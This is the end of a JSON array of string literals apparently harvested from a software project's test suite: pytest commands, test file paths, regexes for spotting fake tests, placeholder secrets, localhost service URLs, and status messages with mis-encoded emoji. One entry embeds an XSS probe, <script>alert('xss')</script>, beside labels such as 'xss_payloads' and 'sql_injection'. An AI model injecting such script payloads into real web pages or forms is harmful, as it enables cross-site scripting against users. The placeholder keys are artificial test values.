    "priority",
    "priority failures to process",
    "priority_failure_count",
    "priority_failures",
    "process",
    "process(es).",
    "process_id",
    "processed",
    "prod",
    "production",
    "productivity_gain",
    "profile",
    "progress_tracking",
    "progression_rate",
    "project:region:instance",
    "prompt_tokens",
    "proposed_files",
    "provider",
    "provider_data",
    "provider_user_id",
    "push",
    "pyproject.toml",
    "pytest",
    "pytest-asyncio",
    "pytest-cov",
    "pytest-mock",
    "pytest-xdist",
    "pytest.ini",
    "pytest.mark.",
    "pytest.mark.asyncio",
    "pytest.mark.real_llm",
    "pytest_",
    "pytest_asyncio",
    "pytest_cov",
    "pytest_mock",
    "python",
    "python scripts/compliance/test_refactor_helper.py analyze app/tests/test_large.py",
    "python scripts/compliance/test_refactor_helper.py suggest app/tests/test_large.py",
    "python scripts/compliance/test_refactor_helper.py validate app/tests/test_large.py",
    "python scripts/compliance/test_size_validator.py",
    "python scripts/compliance/test_size_validator.py --format markdown",
    "python scripts/compliance/test_size_validator.py --output report.md",
    "python test_runner.py --level real_e2e",
    "python test_runner.py --level real_e2e --real-llm",
    "python test_runner.py --level real_e2e --real-llm --llm-model gemini-2.5-pro",
    "python unified_test_runner.py --category frontend --real-services",
    "python unified_test_runner.py --category integration --real-services --real-llm",
    "python unified_test_runner.py --level integration",
    "python unified_test_runner.py --skip-size-validation",
    "python unified_test_runner.py --strict-size",
    "quality_gates",
    "quality_metrics",
    "quality_scores",
    "quality_summary",
    "queue_depth",
    "quick",
    "quick_test",
    "quick_user",
    "r",
    "raceuser@example.com",
    "random",
    "rate_limit",
    "rate_limit_exceeded",
    "rate_limiting",
    "read",
    "readiness_separation",
    "readiness_separation      â†’ test_07_health_check_false_positives_during_init",
    "ready",
    "real",
    "real e2e tests:",
    "real_",
    "real_database",
    "real_e2e",
    "real_llm",
    "real_llm_coverage",
    "real_password",
    "real_services",
    "real_websocket",
    "realistic_test_data_service",
    "reason",
    "recent-test-",
    "recent_runs",
    "recommendation",
    "recommendations",
    "reconfigure",
    "reconnecting",
    "recovery_start",
    "recovery_time_minutes",
    "redirect",
    "redirectUri",
    "redirect_test_code_",
    "redirect_uri",
    "redirect_uri=",
    "redirect_url",
    "redis",
    "redis://localhost:6379/0",
    "redis://localhost:6379/1",
    "redis://localhost:6379/15",
    "redis://localhost:6380",
    "redis:7",
    "redis_client",
    "redis_connection",
    "redis_url",
    "redis|Redis|REDIS",
    "redundant tests...",
    "refresh",
    "refresh123",
    "refresh_token",
    "refresh_token_",
    "refresh_token_123",
    "refresh_token_hash",
    "refreshed",
    "related",
    "remaining requests, got",
    "remove",
    "replace",
    "replacement",
    "replay",
    "report",
    "reports",
    "repository",
    "request_success_rate",
    "request_timeout",
    "requests",
    "required_services",
    "requires_real_llm",
    "requires_real_services",
    "research",
    "resilience",
    "resource",
    "resource_monitoring",
    "response",
    "response time degradation",
    "response_data",
    "response_time",
    "response_time_ms",
    "response_type=code",
    "results",
    "retry_after",
    "return\\s*\\[\\s*\\{\\s*[\"\\']id[\"\\']\\s*:\\s*[\"\\']1[\"\\']",
    "return\\s*\\{\\s*[\"\\']status[\"\\']\\s*:\\s*[\"\\']ok[\"\\']\\s*\\}",
    "return\\s*\\{\\s*[\"\\']test[\"\\']\\s*:\\s*[\"\\']data[\"\\']\\s*\\}",
    "revenue_to_cost_ratio",
    "review_assertion",
    "revocation-user-123",
    "revoke@example.com",
    "revoke@netrasystems.ai",
    "rich",
    "risk_assessment",
    "risk_level",
    "role",
    "role_assignment",
    "root",
    "route",
    "rps",
    "run",
    "run_",
    "run_server.py",
    "runner",
    "runners.py",
    "runs-on:",
    "s",
    "s (limit:",
    "s)",
    "s):",
    "s, invalid:",
    "s, should be <10s",
    "safe_refresh",
    "safe_token",
    "scan_timestamp",
    "scenario",
    "scheduler",
    "schema",
    "scope",
    "scope=",
    "scope=openid%20email%20profile",
    "score",
    "scripts",
    "scripts/dev_launcher.py",
    "scripts/verify_workflow_status.py",
    "search",
    "seasonality",
    "seconds",
    "secret",
    "secrets_loading",
    "secure_password",
    "secure_websocket",
    "security",
    "security-user-999",
    "security@example.com",
    "security_level",
    "self",
    "self.",
    "self.assertEqual",
    "self\\.(\\w+)",
    "self\\\\.assertEqual\\\\((.*?),\\\\s*(.*?)\\\\)",
    "self\\\\.assertFalse\\\\((.*?)\\\\)",
    "self\\\\.assertIsNone\\\\((.*?)\\\\)",
    "self\\\\.assertIsNotNone\\\\((.*?)\\\\)",
    "self\\\\.assertNotEqual\\\\((.*?),\\\\s*(.*?)\\\\)",
    "self\\\\.assertTrue\\\\((.*?)\\\\)",
    "sensitive",
    "server_error",
    "server_startup",
    "service",
    "service health check failed:",
    "service is healthy",
    "service returned",
    "service unavailable",
    "service-123",
    "service1",
    "service2",
    "service:auth_validate",
    "service:read",
    "service:session_create",
    "service:session_revoke",
    "service:user_lookup",
    "service:write",
    "service_discovery",
    "service_discovery         â†’ test_09_service_discovery_timing_issues",
    "service_id",
    "service_registry",
    "service_results",
    "service_secret",
    "service_token",
    "service_unavailable",
    "services",
    "services/test_synthetic_data_service_v3.py",
    "session",
    "session1",
    "session123",
    "session2",
    "session:",
    "session:expired123",
    "session:session1",
    "session:session123",
    "session:session2",
    "session_1",
    "session_a",
    "session_b",
    "session_created",
    "session_expired",
    "session_id",
    "session_limits_enforced",
    "session_manager",
    "session_type",
    "sessions",
    "setUp",
    "setup",
    "setup_method",
    "setup_test_path",
    "setup_test_path()",
    "setup_test_path() not called",
    "setup_test_path\\(\\)\\n",
    "severities",
    "severity",
    "severity_breakdown",
    "share",
    "shared_utilities",
    "should be refactored manually",
    "should have failed",
    "should not decode successfully",
    "side_effect =",
    "signal_handling",
    "signature",
    "signature verification failed",
    "signature-user-789",
    "signature@example.com",
    "signup",
    "similar",
    "similarity",
    "similarity relationships",
    "similarity_type",
    "simple",
    "site-packages",
    "skip",
    "skipped",
    "skipped tests",
    "skipped_tests",
    "sleep",
    "sleep(",
    "slow",
    "slow tests to improve CI/CD speed",
    "smart_adaptive",
    "smoke",
    "soak",
    "socket",
    "span_id",
    "spec.",
    "specific_run_id",
    "split_by_",
    "split_by_category",
    "split_by_class",
    "split_by_feature",
    "splitting large file:",
    "splitting_suggestions",
    "sql_injection",
    "sqlalchemy",
    "sqlite",
    "sqlite+aiosqlite:///",
    "sqlite+aiosqlite:///:memory:",
    "sqlite+aiosqlite:///test_auth.db",
    "sqlite://",
    "src",
    "ssl",
    "ssl parameter missing for regular connection",
    "ssl=",
    "ssl=disable",
    "ssl=require",
    "ssl_parameter_resolution",
    "sslcert=",
    "sslkey=",
    "sslmode not converted to ssl",
    "sslmode=",
    "sslmode=disable",
    "sslmode=require",
    "sslrootcert=",
    "stable_with_noise",
    "stage",
    "staging",
    "staging mode",
    "staging-quick",
    "staging-real",
    "staging-workflows",
    "staging_test_code",
    "staging_test_state",
    "staging_validation_",
    "standalone",
    "standard",
    "start_line",
    "start_time",
    "startup or login or websocket",
    "startup.test",
    "startup_timeout",
    "state",
    "state with spaces",
    "state/with/slashes",
    "state=",
    "status",
    "status_code",
    "stop",
    "storage",
    "store",
    "store_true",
    "strategies",
    "strategy",
    "stream",
    "stress",
    "structural_similarity",
    "stub",
    "sub",
    "success",
    "success_count",
    "success_rate",
    "successful_requests",
    "suggest",
    "suggested_fixes",
    "suggestions",
    "summary",
    "superadmin",
    "superuser",
    "svc_id",
    "syntax errors remain - manual intervention may be needed",
    "syntax errors remain:",
    "syntax_error",
    "syntax_valid",
    "sys",
    "sys.path",
    "system",
    "system:manage_settings",
    "system:view_logs",
    "system:view_status",
    "table_output",
    "table_output_format",
    "tampered123",
    "target",
    "target_duration",
    "target_test",
    "tax_season",
    "team_collaboration",
    "team|collaboration|sharing|permissions",
    "tearDown",
    "teardown",
    "teardown_method",
    "test",
    "test directories** identified\n- **",
    "test files",
    "test files are already failing!",
    "test files for category '",
    "test files to validate...",
    "test files** across the project (excluding dependencies)\n- **",
    "test files, found",
    "test files:",
    "test functions from",
    "test quality issues",
    "test request",
    "test requirement violations:",
    "test stubs in production code",
    "test(",
    "test*",
    "test*.py",
    "test-act-simple.yml",
    "test-api-key",
    "test-branch",
    "test-clickhouse-password-for-integration-testing",
    "test-env",
    "test-fernet-key-for-testing-only-base64encode=",
    "test-gemini-key-from-env",
    "test-github-client-id",
    "test-github-client-secret",
    "test-github-secret",
    "test-google-client",
    "test-google-client-id",
    "test-google-client-id-for-integration-testing",
    "test-google-client-id.apps.googleusercontent.com",
    "test-google-client-secret",
    "test-google-client-secret-for-integration-testing",
    "test-google-secret",
    "test-jwt-key-from-env",
    "test-jwt-secret-key-for-integration-testing-must-be-32-chars-minimum",
    "test-jwt-secret-key-that-is-long-enough-for-testing-purposes",
    "test-jwt-secret-key-that-is-long-enough-for-testing-purposes-and-very-secure",
    "test-oauth-client-id",
    "test-oauth-secret",
    "test-related process(es):",
    "test-secret",
    "test-secret-key-for-testing-only-must-be-at-least-32-chars",
    "test-service",
    "test-service-name",
    "test-service-secret-for-cross-service-auth-32-chars-minimum-length",
    "test-session",
    "test-token-123",
    "test-user",
    "test-user-123",
    "test-user-456",
    "test-user-789",
    "test.com",
    "test/repo",
    "test1",
    "test123",
    "test123456",
    "test1_category",
    "test1_complexity",
    "test1_file",
    "test1_lines",
    "test1_name",
    "test2",
    "test2_category",
    "test2_complexity",
    "test2_file",
    "test2_lines",
    "test2_name",
    "test@example.com",
    "test@netrasystems.ai",
    "test@tempmail.com",
    "test\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
    "test_",
    "test_(\\w+)_",
    "test_*.py",
    "test_.*?(\\w+)_\\w+$",
    "test_.*_e2e|e2e_test_|TestE2E|test_end_to_end",
    "test_.*_integration|integration_test_|TestIntegration",
    "test_.*_load|load_test_|TestLoad",
    "test_.*_performance|performance_test_|TestPerformance|test_.*_perf",
    "test_.*_real_llm|real_llm_test_|with_real_llm|@real_llm|@pytest\\.mark\\.real_llm",
    "test_.*_security|security_test_|TestSecurity",
    "test_.*_unit|unit_test_|TestUnit",
    "test_access_token",
    "test_agent",
    "test_auth_code_",
    "test_auth_service",
    "test_backend",
    "test_categories.py",
    "test_categorization.json",
    "test_client_id",
    "test_code",
    "test_config.py",
    "test_configs",
    "test_connection",
    "test_count",
    "test_details",
    "test_dir",
    "test_directories",
    "test_discovery.py",
    "test_env",
    "test_failures",
    "test_file",
    "test_file_size",
    "test_fix_results_",
    "test_framework",
    "test_framework.test_runner",
    "test_framework_size",
    "test_frameworks",
    "test_frontend",
    "test_function_complexity",
    "test_google_client_id",
    "test_google_client_secret",
    "test_history.json",
    "test_integration",
    "test_jwt_secret_key_that_is_long_enough_for_testing_purposes",
    "test_message",
    "test_methods",
    "test_metrics",
    "test_overlap_report.json",
    "test_overlap_report.md",
    "test_password",
    "test_priority",
    "test_realistic_data_integration.py",
    "test_refresh",
    "test_refresh_token",
    "test_report_",
    "test_reports",
    "test_reports/real_test_violations.json",
    "test_results",
    "test_results.json",
    "test_results_100_iterations.json",
    "test_run_123",
    "test_runner",
    "test_runners",
    "test_secret",
    "test_service",
    "test_session",
    "test_session_123",
    "test_similarities.csv",
    "test_size_compliance_examples.py",
    "test_size_violations.json",
    "test_state",
    "test_status",
    "test_token",
    "test_type_distribution",
    "test_update_spec.xml",
    "test_user",
    "test_user_123",
    "test_user_creation.py (80 lines)\n- test_user_creation_valid_data()\n- test_user_creation_invalid_email()\n- test_user_creation_duplicate_email()\n\ntest_user_authentication.py (85 lines)  \n- test_authenticate_valid_credentials()\n- test_authenticate_invalid_password()\n- test_authenticate_nonexistent_user()\n\ntest_user_permissions.py (90 lines)\n- test_user_default_permissions()\n- test_admin_permissions()\n- test_permission_inheritance()\n\ntest_user_profile.py (70 lines)\n- test_profile_update()\n- test_profile_validation()\n- test_profile_privacy()\n\ntest_user_helpers.py (50 lines)\n- create_test_user()\n- create_admin_user()\n- get_test_auth_token()",
    "test_utils",
    "test_utils.py",
    "test_violations_report.md",
    "testcontainers",
    "testing",
    "testpass",
    "tests",
    "tests\u001b[0m",
    "tests failed",
    "tests passed",
    "tests passed (",
    "tests to test suite",
    "tests without validation",
    "tests)",
    "tests)\u001b[0m -",
    "tests) -",
    "tests, avg score:",
    "tests.e2e.",
    "tests/",
    "tests/**/*.py",
    "tests/**/*_test.py",
    "tests/conftest.py",
    "tests/e2e",
    "tests/integration/red_team/tier1_catastrophic/test_agent_lifecycle_management.py",
    "tests/integration/red_team/tier1_catastrophic/test_api_gateway_rate_limiting_accuracy.py",
    "tests/integration/red_team/tier1_catastrophic/test_cross_database_transaction_consistency.py",
    "tests/integration/red_team/tier1_catastrophic/test_database_migration_failure_recovery.py",
    "tests/integration/red_team/tier1_catastrophic/test_llm_service_integration.py",
    "tests/integration/red_team/tier1_catastrophic/test_message_persistence_and_retrieval.py",
    "tests/integration/red_team/tier1_catastrophic/test_oauth_database_consistency.py",
    "tests/integration/red_team/tier1_catastrophic/test_service_discovery_failure_cascades.py",
    "tests/integration/red_team/tier1_catastrophic/test_thread_crud_operations_data_consistency.py",
    "tests/integration/red_team/tier1_catastrophic/test_websocket_authentication_integration.py",
    "tests/integration/red_team/tier1_catastrophic/test_websocket_message_broadcasting.py",
    "tests/integration/red_team/tier2_major_failures/test_clickhouse_data_ingestion_pipeline.py",
    "tests/integration/red_team/tier2_major_failures/test_file_upload_and_storage.py",
    "tests/integration/red_team/tier2_major_failures/test_redis_session_store_consistency.py",
    "tests/integration/staging/test_staging_database_connection_resilience.py",
    "tests/integration/user_flows/test_conversion_paths.py",
    "tests/integration/user_flows/test_early_tier_flows.py",
    "tests/integration/user_flows/test_enterprise_flows.py",
    "tests/integration/user_flows/test_free_tier_onboarding.py",
    "tests/integration/user_flows/test_mid_tier_flows.py",
    "tests/test_example_message_flow.py",
    "tests/test_example_message_integration.py",
    "tests/test_super_e2e.py",
    "tests/test_system_startup.py",
    "tests:",
    "tests\\.unified\\.e2e\\.",
    "tests_passed",
    "testuser@example.com",
    "text",
    "third_party",
    "thorough",
    "threshold_based",
    "throughput",
    "throughput_rps",
    "tier",
    "tier customer data and access control",
    "tier functionality",
    "tier has insufficient test coverage",
    "tier_coverage",
    "time",
    "time.sleep",
    "time.time",
    "time_based",
    "time_utilities",
    "timed out",
    "timeout",
    "timeout_rate",
    "timestamp",
    "timing_test_service",
    "title",
    "to",
    "to <10 within 2 sprints",
    "to sync",
    "to_dict",
    "token",
    "token1",
    "token123",
    "token_created",
    "token_exchange",
    "token_generation",
    "token_limit",
    "token_limits",
    "token_refreshed",
    "token_revoked",
    "token_type",
    "token_validation",
    "too.few.parts",
    "too.many.parts.here.extra",
    "tool_dispatcher = Mock()",
    "tool_dispatcher = ToolDispatcher(llm_manager)",
    "top_100",
    "top_overlaps_by_category",
    "top_value_tests",
    "total",
    "total_agents",
    "total_business_value",
    "total_categories",
    "total_config_fixes",
    "total_cost",
    "total_costs_usd",
    "total_duration",
    "total_failures",
    "total_fake_tests",
    "total_file_fixes",
    "total_files",
    "total_files_scanned",
    "total_import_fixes",
    "total_iterations",
    "total_lines",
    "total_llm_cost",
    "total_methods",
    "total_requests",
    "total_similarity_pairs",
    "total_test_files",
    "total_test_functions",
    "total_tests",
    "total_tokens",
    "total_tracked_tests",
    "total_violations",
    "totals",
    "trace_id",
    "traceback",
    "traceparent",
    "tracestate",
    "traffic_data",
    "trigger",
    "trivial tests for refactoring",
    "true",
    "tsc",
    "typ",
    "type",
    "typescript",
    "ultra_fast",
    "unauthorized_client",
    "unavailable",
    "unexpected keyword argument 'sslmode'",
    "unexpectedly found in database",
    "unified",
    "unified_report.md",
    "unified_secret_789",
    "unified_test_runner.py",
    "unique_code_",
    "unit",
    "unittest",
    "unittest.TestCase",
    "unknown",
    "unmatched",
    "unrecognized",
    "unverified@example.com",
    "up",
    "update",
    "updated_at",
    "url",
    "us-central1",
    "usage",
    "use_mocks",
    "user",
    "user space@domain.com",
    "user-",
    "user-to-revoke",
    "user1",
    "user123",
    "user1@example.com",
    "user2",
    "user2@example.com",
    "user3@example.com",
    "user456",
    "user:email",
    "user:read_profile",
    "user:update_profile",
    "user@",
    "user@domain",
    "user@netrasystems.ai",
    "user_123",
    "user_agent",
    "user_cancelled_login",
    "user_flows",
    "user_id",
    "user_info",
    "user_initiated",
    "user_not_found",
    "uses_real_clickhouse",
    "uses_real_database",
    "uses_real_llm",
    "uses_real_redis",
    "using mock",
    "utf-8",
    "util",
    "utilities",
    "utils.py",
    "uvicorn",
    "valid",
    "valid1",
    "valid123",
    "valid@example.com",
    "valid_code_",
    "valid_code_for_reuse_",
    "valid_code_with_pkce_",
    "valid_google_token",
    "valid_secret",
    "valid_token",
    "validate",
    "validate_auth_url",
    "validate_auth_url must be callable",
    "validate_auth_url should be callable",
    "validate_auth_url should return boolean",
    "validate_auth_url should return boolean, got:",
    "validation_test",
    "value",
    "value_score",
    "venv",
    "venv_test",
    "verbose",
    "verified",
    "verified_email",
    "verify",
    "verify_exp",
    "verify_signature",
    "version",
    "version: '3.8'\n\nservices:\n  postgres:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_USER: netra_test\n      POSTGRES_PASSWORD: test_password\n      POSTGRES_DB: netra_test\n    ports:\n      - \"5433:5432\"\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U netra_test\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  redis:\n    image: redis:7-alpine\n    ports:\n      - \"6380:6379\"\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5",
    "very-long-email",
    "view",
    "violation_type",
    "violation_type_breakdown",
    "violations",
    "violations (dry_run=",
    "violations automatically.",
    "violations in",
    "violations remain after auto-fix:",
    "violations)",
    "violations):",
    "violations.",
    "w",
    "warning",
    "warnings",
    "warp-custom",
    "warp-custom-default=catthehacker/ubuntu:act-latest",
    "web",
    "web_",
    "webpack",
    "websocket",
    "websocket_config",
    "websocket_connection",
    "websocket_manager",
    "websocket_manager = Mock()",
    "websocket_manager = UnifiedWebSocketManager()",
    "websocket_timeout",
    "websocket_url",
    "websockets library not installed - skipping WebSocket connection test",
    "websocket|WebSocket|ws://",
    "websocket|ws|realtime|socket",
    "weekend_multiplier",
    "widget",
    "win32",
    "with",
    "worker",
    "workers",
    "workflow",
    "workflow-test-report.json",
    "workflow_call",
    "workflow_verification_results.md",
    "workflow_verification_test_report.md",
    "workflows",
    "workflows to test",
    "workload",
    "workload_patterns",
    "workload_type",
    "workloads",
    "write",
    "wrong",
    "wrong-issuer",
    "wrong-secret-key",
    "wrong_secret",
    "wrong_session_12345",
    "wrong_verifier",
    "wrongpass",
    "ws",
    "ws://",
    "ws://localhost:",
    "ws://localhost:8000",
    "ws://localhost:8000/ws",
    "ws_url",
    "wss://api.staging.netrasystems.ai/ws",
    "wss://ws.staging.netra.ai",
    "x",
    "x (valid:",
    "xdist",
    "xss_payloads",
    "y",
    "year_end",
    "zinc",
    "{",
    "|",
    "| $",
    "| Database | Queries | Avg Latency (ms) |",
    "| File | Function | Lines | Limit | Fix Suggestion |",
    "| File | Lines | Limit | Fix Suggestion |",
    "| Model | Calls | Estimated Cost |",
    "|----------|---------|------------------|",
    "|-------|-------|----------------|",
    "|------|----------|-------|-------|----------------|",
    "|------|-------|-------|----------------|",
    "|def",
    "}",
    "â€¢",
    "â€¢ For excessive_mocking violations: Use real components where possible",
    "â€¢ For file_size violations: Split large test files into focused modules",
    "â€¢ For function_size violations: Extract helper methods",
    "â€¢ For mock_component violations: Replace with real component instantiation",
    "â€¢ Run with --fix to attempt automatic fixes",
    "â„¹ï¸",
    "â†’",
    "â†” `",
    "â­ï¸",
    "â­ï¸ SKIPPED",
    "â°",
    "â° Test timed out",
    "â±ï¸ STABILITY | Keeping services running for 5 seconds...",
    "â³ Waiting for services to be healthy...",
    "âš ",
    "âš  Manual fix needed: Extract helpers in",
    "âš  Manual fix needed: Split",
    "âš  Needs manual review:",
    "âš ï¸",
    "âš ï¸  .secrets file not found. Creating with mock values...",
    "âš ï¸  Exiting with warning due to",
    "âš ï¸  Found",
    "âš ï¸  Issues Found (",
    "âš ï¸  Issues found in",
    "âš ï¸  MEDIUM SEVERITY (",
    "âš ï¸  NO TESTS WERE RUN",
    "âš ï¸  Test timeout",
    "âš ï¸  Validation timeout",
    "âš ï¸ HIGH: Address",
    "âš ï¸ MEDIUM",
    "âš ï¸ No model response received within timeout",
    "âš ï¸ SOME TESTS FAILED",
    "âš ï¸ Some tests failed. Please check the failures above.",
    "âš ï¸ WARNING | Auth service failed to start",
    "âš ï¸ WARNING | Auth system verification failed",
    "âš ï¸ WARNING | Backend readiness check failed",
    "âš ï¸ WARNING | Cleanup error:",
    "âš ï¸ WARNING | Migration issues, continuing...",
    "âš ï¸ WARNING | Secrets loading had issues, continuing...",
    "âš ï¸ Warning:",
    "âš¡ HIGH PRIORITY: Address",
    "âœ…",
    "âœ…  No fake tests detected - good job!",
    "âœ… ACT found:",
    "âœ… All E2E tests passed successfully!",
    "âœ… All auth service startup tests passed",
    "âœ… All imports successful",
    "âœ… All services are healthy",
    "âœ… All test files comply with real test requirements!",
    "âœ… All tests appear to be legitimate - no fake tests detected!",
    "âœ… All tests completed successfully!",
    "âœ… All tests comply with real test requirements!",
    "âœ… All tests passed!",
    "âœ… Auth service import resolution test passed",
    "âœ… Auth startup command structure test passed",
    "âœ… Authentication successful (user:",
    "âœ… Configuration validation passed",
    "âœ… Created .secrets file with mock values",
    "âœ… Docker found:",
    "âœ… Dry run successful",
    "âœ… Fixed and validated successfully",
    "âœ… Fixed circular env.ACT reference",
    "âœ… Graceful degradation with optional services",
    "âœ… Handler initialization successful",
    "âœ… Imports successful",
    "âœ… Initialization successful",
    "âœ… Message sent successfully",
    "âœ… Message validation successful",
    "âœ… Model response contains expected pattern:",
    "âœ… No fake tests detected! Codebase follows testing best practices.",
    "âœ… PASS",
    "âœ… PASSED",
    "âœ… Passed:",
    "âœ… Port allocation conflict prevention",
    "âœ… Readiness vs health check separation",
    "âœ… Received model event:",
    "âœ… STAGING TESTS PASSED",
    "âœ… SUCCESS | Auth service started",
    "âœ… SUCCESS | Auth system is ready",
    "âœ… SUCCESS | Backend is ready",
    "âœ… SUCCESS | Backend service started",
    "âœ… Service dependency ordering",
    "âœ… Service discovery timing issues",
    "âœ… Services started successfully",
    "âœ… Services stopped",
    "âœ… Successfully fixed test_utils imports!",
    "âœ… Syntax valid",
    "âœ… TEST PASSED | Service startup orchestration test completed successfully in",
    "âœ… Test audit report generated:",
    "âœ… Thread created:",
    "âœ… WebSocket connection authenticated",
    "âœ“ All components are implemented and working",
    "âœ“ All files have correct import order!",
    "âœ“ All syntax errors fixed!",
    "âœ“ Anti-patterns to avoid",
    "âœ“ Examples and documentation provided",
    "âœ“ File is compliant with size limits!",
    "âœ“ File splitting strategies",
    "âœ“ Fixed mock component function in",
    "âœ“ Functions under 8 lines",
    "âœ“ Helper method extraction",
    "âœ“ Integration with test runner is complete",
    "âœ“ Parametrized tests",
    "âœ“ Pre-run validation function is available",
    "âœ“ Proper fixture usage",
    "âœ“ Received response:",
    "âœ“ Reduced mocking in",
    "âœ“ Test already passing",
    "âœ“ Test size limits enforcement is fully functional",
    "âœ“ Updated:",
    "âœ“ WebSocket connection established!",
    "âœ“ WebSocket test passed!",
    "âœ— Connection refused:",
    "âœ— Invalid status code:",
    "âœ— No response received within 5 seconds",
    "âœ— Unexpected error:",
    "âœ— WebSocket test failed!",
    "âŒ",
    "âŒ (FAILING)",
    "âŒ ACT not found. Please install ACT first.",
    "âŒ Configuration error:",
    "âŒ Docker not found or not running.",
    "âŒ Dry run failed:",
    "âŒ E2E test failed:",
    "âŒ Error checking ACT:",
    "âŒ Error checking Docker:",
    "âŒ Error:",
    "âŒ Exiting with error code due to",
    "âŒ Exiting with error:",
    "âŒ FAIL",
    "âŒ FAILED",
    "âŒ FAILED | Backend service failed to start",
    "âŒ FAILED | Database validation failed",
    "âŒ FAILED | Environment check failed",
    "âŒ FAILED | No services started successfully",
    "âŒ Failed Workflows:",
    "âŒ Failed to fix",
    "âŒ Failed:",
    "âŒ Found",
    "âŒ Handler initialization error:",
    "âŒ Handler initialization failed",
    "âŒ Import error:",
    "âŒ Message validation error:",
    "âŒ Message validation failed",
    "âŒ Prerequisites check failed",
    "âŒ Quick validation failed:",
    "âŒ SOME TESTS FAILED",
    "âŒ STAGING TESTS FAILED (exit code:",
    "âŒ Services failed to become healthy within timeout",
    "âŒ Some coordination fixes failed validation",
    "âŒ Syntax error:",
    "âŒ TEST FAILED | Service startup orchestration test failed after",
    "âŒ Test error:",
    "âŒ Test file not found:",
    "âŒ Validation error:",
    "âŒ WebSocket manager not available",
    "æµ‹è¯•ç”¨æˆ· ðŸš€ <script>alert('xss')</script>",
    "ðŸŽ‰ ALL COORDINATION FIXES VALIDATED SUCCESSFULLY!",
    "ðŸŽ‰ ALL TESTS PASSED!",
    "ðŸŽ‰ All tests passed! Staging environment is fully operational.",
    "ðŸŽ‰ All tests passing after",
    "ðŸŽ‰ Quick validation passed!",
    "ðŸŽ¯ Focus on testing real business logic, not mocks or constants",
    "ðŸŽ¯ PHASE 6 | Testing service readiness...",
    "ðŸ TESTING COMPLETE | Service startup orchestration test finished",
    "ðŸ’¡ *",
    "ðŸ’¡ Suggested fixes:",
    "ðŸ’¡ To fix these issues:",
    "ðŸ’¥",
    "ðŸ’¥ ERROR | Test failed with exception:",
    "ðŸ’¥ Error running",
    "ðŸ’¬ Testing chat message flow...",
    "ðŸ’¾ PHASE 3 | Database validation...",
    "ðŸ’¾ Report saved to:",
    "ðŸ’¾ Saved fixes to",
    "ðŸ“",
    "ðŸ“„ JSON report saved to:",
    "ðŸ“ˆ **Success Metric:** Reduce violations from",
    "ðŸ“ˆ DETAILED METRICS",
    "ðŸ“Š Found",
    "ðŸ“Š Summary:",
    "ðŸ“Š TEST RESULTS SUMMARY",
    "ðŸ“‹ MEDIUM: Schedule",
    "ðŸ“‹ PHASE 1 | Environment and pre-checks...",
    "ðŸ“‹ Running",
    "ðŸ“‹ Test Report",
    "ðŸ“ Line",
    "ðŸ“– Review SPEC/testing.xml for detailed fake test guidance",
    "ðŸ“š Use patterns from app/tests/examples/test_real_functionality_examples.py",
    "ðŸ“ Validating syntax:",
    "ðŸ“¦ Starting services with dev launcher...",
    "ðŸ”„ PHASE 4 | Migration check...",
    "ðŸ”Œ Testing WebSocket connection...",
    "ðŸ” Add fake test detection to CI pipeline to prevent regressions",
    "ðŸ” Checking prerequisites...",
    "ðŸ” Running Quick Validation Checks",
    "ðŸ” Running Validation Checks",
    "ðŸ” PHASE 2 | Loading secrets...",
    "ðŸ” Testing authentication...",
    "ðŸ”¥",
    "ðŸ”¥ **",
    "ðŸ”¥ HIGH",
    "ðŸ”¥ URGENT: Fix",
    "ðŸ”§ Action:",
    "ðŸ”§ Attempting to fix issues in:",
    "ðŸ”§ LOW: Consider consolidating",
    "ðŸ”´",
    "ðŸš€ PHASE 5 | Starting services...",
    "ðŸš€ Starting Cold Start E2E Test Suite",
    "ðŸš€ Starting Example Message Flow Test Suite",
    "ðŸš€ Starting GitHub Workflows Testing with ACT",
    "ðŸš¨",
    "ðŸš¨ CRITICAL: Remove",
    "ðŸš¨ HIGH SEVERITY (",
    "ðŸŸ¡",
    "ðŸŸ¢",
    "ðŸ¤– Testing model response...",
    "ðŸ§ª Testing workflow:",
    "ðŸ§¹ CLEANUP | Shutting down services...",
    "ðŸ§¹ Cleaning up..."
  ]
}